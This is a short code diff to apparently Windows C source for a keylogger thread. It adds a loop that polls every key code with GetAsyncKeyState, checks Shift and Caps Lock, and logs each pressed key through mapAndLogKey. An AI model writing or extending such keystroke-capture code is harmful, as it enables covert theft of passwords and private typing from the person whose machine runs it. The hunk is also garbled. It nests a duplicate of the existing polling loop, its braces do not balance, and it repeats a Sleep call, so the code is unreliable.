@@ -139,8 +139,15 @@ DWORD WINAPI keyloggerThread(LPVOID lpParameter) {
                                    (GetKeyState(VK_CAPITAL) & 0x0001);
                 mapAndLogKey(key, shiftPressed);
                 Sleep(10);  // Avoid duplicate logging
+        for (int key = 8; key <= 255; key++) {  // Key codes from 8 to 255
+            if (GetAsyncKeyState(key) & 0x8000) {  // Key is pressed
+                int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || 
+                                   (GetKeyState(VK_CAPITAL) & 0x0001);
+                mapAndLogKey(key, shiftPressed);
+                Sleep(10);  // Avoid duplicate logging
             }
         }
+        Sleep(10);
         Sleep(10);
     }
     return 0;
